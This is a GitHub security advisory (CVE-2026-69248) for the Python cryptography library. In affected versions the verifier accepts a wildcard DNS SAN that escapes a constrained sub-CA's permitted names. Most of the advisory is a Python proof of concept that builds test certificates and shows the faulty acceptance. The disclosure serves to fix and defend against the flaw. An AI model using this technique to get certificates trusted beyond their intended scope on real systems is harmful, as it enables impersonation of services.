# [M] python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees

## Summary
Severity: Medium
Advisory: GHSA-m2h6-j472-rp4c
CVE: CVE-2026-69248
CWE: CWE-295
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-08-03
Source: https://github.com/advisories/GHSA-m2h6-j472-rp4c
Type: github-advisory

## Affected
- PyPI: `cryptography` — affected >=45.0.0 <49.0.0

## Details
### Summary
If an intermediate constrained CA permits the DNS name `foo.example.com`, and the leaf certificate has a wildcard in its DNS SAN of `*.example.com`, python-cryptography's verifier accepts which allows escaping outside of the permitted names.

### PoC

```
#!/usr/bin/env python3
"""Standalone PoC: pyca's DNSConstraint::matches admits a too-broad wildcard SAN.

Setup:
  Sub-CA permitted constraint: dNSName = foo.example.com
  Leaf SAN:                    dNSName = *.example.com
Expected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).
Observed: pyca accepts; further, asks server-verifier whether the leaf is
authoritative for `bar.example.com` and pyca answers yes — a sub-CA scope
escape.
"""
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.verification import (
    PolicyBuilder, Store, ExtensionPolicy, Criticality, VerificationError,
)

now = datetime.datetime(2027, 1, 1, tzinfo=datetime.timezone.utc)
day = datetime.timedelta(days=1)

def build(subject, issuer, key, issuer_key, ca, exts=()):
    b = (x509.CertificateBuilder()
         .subject_name(subject).issuer_name(issuer)
         .public_key(key.public_key())
         .serial_number(x509.random_serial_number())
         .not_valid_before(now - 30 * day)
         .not_valid_after(now + 3650 * day)
         .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True))
    for e, c in exts:
        b = b.add_extension(e, c)
    return b.sign(issuer_key, hashes.SHA256())

# Root
rk = ec.generate_private_key(ec.SECP256R1())
rn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Test Root")])
root = build(rn, rn, rk, rk, True)

# Sub-CA constrained to foo.example.com
sk = ec.generate_private_key(ec.SECP256R1())
sn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Sub-CA")])
nc = x509.NameConstraints(
    permitted_subtrees=[x509.DNSName("foo.example.com")],
    excluded_subtrees=None,
)
sub = build(sn, rn, sk, rk, True, [(nc, True)])

# Leaf with SAN *.example.com (over-broad relative to the constraint)
lk = ec.generate_private_key(ec.SECP256R1())
ln = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Leaf")])
san = x509.SubjectAlternativeName([x509.DNSName("*.example.com")])
leaf = build(ln, sn, lk, sk, False, [(san, False)])

# Policies
ca_pol = ExtensionPolicy.permit_all().require_present(
    x509.BasicConstraints, Criticality.AGNOSTIC, None,
)
ee_pol = ExtensionPolicy.permit_all().require_present(
    x509.SubjectAlternativeName, Criticality.AGNOSTIC, None,
)
v = (
    PolicyBuilder()
    .store(Store([root]))
    .time(now)
    .extension_policies(ca_policy=ca_pol, ee_policy=ee_pol)
    .build_server_verifier(x509.DNSName("bar.example.com"))
)
try:
    v.verify(leaf, [sub])
    print("BUG: pyca trusted leaf as bar.example.com though sub-CA was constrained to foo.example.com")
except VerificationError as e:
    print(f"EXPECTED: VerificationError: {e}")
```

### Impact

Acceptance of invalid certificate chain.

## References
- https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c
- https://nvd.nist.gov/vuln/detail/CVE-2026-69248
- https://github.com/pyca/cryptography/pull/14888
- https://github.com/pyca/cryptography/commit/286c89128
- https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2
- https://github.com/pyca/cryptography
- https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3554.yaml
